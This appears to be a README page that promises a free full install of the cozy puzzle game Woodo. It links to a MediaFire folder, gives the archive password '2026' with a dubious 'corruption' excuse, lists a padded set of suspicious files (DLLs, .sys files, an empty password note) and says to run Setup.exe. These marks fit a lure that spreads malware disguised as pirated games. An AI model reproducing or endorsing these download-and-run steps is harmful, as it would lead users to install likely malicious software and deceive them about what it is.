## 🕹️ About

Woodo is a cozy 3D puzzle game developed by Tiny Monks Tales and published by Daedalic Entertainment. Set in a peaceful wooden world, it follows Foxy and Ben the frog through interconnected dioramas and moments from their shared adventure. Players assemble each scene piece by piece, placing objects in the correct locations while exploring the 3D space for hidden pieces. Completed dioramas fill with color, animations, and small surprises, supported by a warm narrator and a gentle, nostalgic atmosphere. This package is prepared for straightforward installation of the full game.

Woodo is ideal for players seeking a relaxing, family-friendly single-player puzzle experience with tactile mechanics and a storybook atmosphere.

## ✨ Features

- 🌳 **Cozy World** — Explore a peaceful, colorful setting inspired by childhood wonder.
- ✨ **Living Scenes** — Watch dioramas come to life with animations and surprises.
- 📖 **Gentle Story** — Follow Foxy and Ben through an interconnected puzzle-tale.
- 🧩 **Diorama Puzzles** — Assemble handcrafted wooden scenes piece by piece.
- 🔍 **3D Exploration** — Turn and inspect each scene to discover hidden pieces.
- 🎧 **Narrated Atmosphere** — Enjoy a comforting narration designed to complement the journey.

### Step 1: Download

Download the package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- global.cfg <- Global settings
|-- driver.umap <- Driver data
|-- patch_1.bnk <- Audio banks
|-- api.pak <- API modules
|-- res.pak <- Resources archive
|-- driver.pak <- Driver archive
|-- Password 2026.txt <- Password reminder (empty)
|-- assets.wem <- Asset audio
|-- localization.ini <- Language files
|-- license.bank <- License data
|-- scripts.lic <- Game scripts
|-- lang.sys <- Language system
|-- uninstall.key <- Uninstall key
|-- bootstrap.wem <- Bootstrap audio
|-- installer.dat <- Installer data
|-- update_1.res <- Update resources
|-- license.wem <- Audio assets
|-- update_1.ini <- Update config
|-- settings.bin <- Configuration
|-- dlc.md5 <- DLC checksums
|-- physics.sys <- Physics engine
|-- launcher.dll <- Launcher library
|-- animations.dll <- Animation system
|-- audio.res <- Audio resources
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
